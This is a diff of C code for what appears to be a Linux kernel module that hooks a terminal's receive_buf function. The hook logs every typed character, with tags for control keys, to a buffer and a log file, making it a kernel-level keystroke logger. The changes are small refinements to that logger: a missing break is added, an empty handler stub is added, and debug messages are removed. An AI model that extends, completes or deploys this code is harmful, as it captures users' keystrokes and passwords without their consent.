@@ -62,6 +62,7 @@ void handle_single_char(char* cp){
     break;
   case 0x03:	//^C
     append_c( "[^C]", 4);
+    break;
   case 0x04:	//^D
     append_c("[^D]", 4);
     break;
@@ -141,6 +142,10 @@ void handle_single_char(char* cp){
     append_c((char*)cp,1);
   }
 }
+
+// handles special characters
+void handle_special_char(char* cp, size_t count){
+}
 // pointer to the old receive_buf function
 void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
 			char*,int);
@@ -165,7 +170,6 @@ void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
       }else{
 	// otherwise, add the char
 	handle_single_char((char*)cp);
-	//append_c((char*)cp,1);
 
 	// check if the user pressed enter
 	if(cp[0] == 0x0D ||
@@ -203,18 +207,16 @@ static int init(void) {
   if(logfile) kwrite(logfile,0,init_message,33);
 
   if(file){
-
     // we got a tty, so lets init our logger
     logger = NULL;
     logger = (struct logger*)kmalloc(sizeof(struct logger),GFP_KERNEL);
     reset_logger();
 
-    printk(KERN_ALERT "tty was opened\n");
+    // grab the tty from the file
     struct tty_file_private* priv = NULL;
     priv = file->private_data;
     if(priv) tty=priv->tty;
     if(tty){
-      printk(KERN_ALERT "this is a valid tty\n");
       if(tty->ldisc->ops->receive_buf){
 	//change the old receive_buf
 	old_receive_buf = tty->ldisc->ops->receive_buf;
